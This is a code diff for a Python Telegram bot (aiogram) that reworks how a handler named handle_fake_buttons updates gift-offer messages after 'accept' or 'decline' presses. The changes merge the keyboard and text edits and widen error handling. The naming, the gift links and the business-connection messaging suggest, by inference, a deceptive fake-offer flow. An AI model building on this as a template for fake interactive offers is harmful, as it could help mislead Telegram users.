@@ -143,7 +143,7 @@ async def handle_offer_command(message: types.Message):
             except: pass
         print(f"Ошибка: {e}")
 
-# --- МГНОВЕННОЕ ОБНОВЛЕНИЕ БЕЗ ЗАДЕРЖЕК ---
+# --- ИДЕАЛЬНОЕ ИЗМЕНЕНИЕ ---
 @dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
 async def handle_fake_buttons(callback: types.CallbackQuery):
     if not callback.message: return
@@ -156,8 +156,6 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
     pretty_name = get_pretty_name(gift_slug)
     business_connection_id = callback.message.business_connection_id
     msg_data = MESSAGES.get(lang, MESSAGES["ru"])
-
-    await callback.answer("Обработка...")
 
     if action == "accept":
         new_text = msg_data["success"].format(link=link, pretty_name=pretty_name) + "\u200b"
@@ -175,23 +173,13 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
         new_keyboard = None
         alert_text = None
 
-    # ХАК: Сначала меняем только клавиатуру (кнопки). Это заставляет мобильный клиент обновиться.
-    try:
-        await bot.edit_message_reply_markup(
-            chat_id=callback.message.chat.id,
-            message_id=callback.message.message_id,
-            reply_markup=new_keyboard,
-            business_connection_id=business_connection_id
-        )
-    except Exception as e:
-        print(f"Ошибка смены кнопок: {e}")
-
-    # Затем мгновенно меняем текст и оставляем анимацию
+    # МЕНЯЕМ СООБЩЕНИЕ (Возвращаем link_preview_options, чтобы телефон не тупил)
     try:
         await bot.edit_message_text(
             chat_id=callback.message.chat.id,
             message_id=callback.message.message_id,
             text=new_text,
+            reply_markup=new_keyboard,
             business_connection_id=business_connection_id,
             parse_mode="HTML",
             link_preview_options=LinkPreviewOptions(
@@ -202,9 +190,11 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
         )
     except TelegramBadRequest as e:
         if "message is not modified" not in str(e).lower():
-            print(f"Ошибка изменения текста: {e}")
+            print(f"Ошибка изменения: {e}")
+    except Exception as e:
+        print(f"Неизвестная ошибка: {e}")
 
-    # Показываем окно
+    # Показываем всплывающее окно
     if alert_text:
         await callback.answer(alert_text, show_alert=True)
     else:
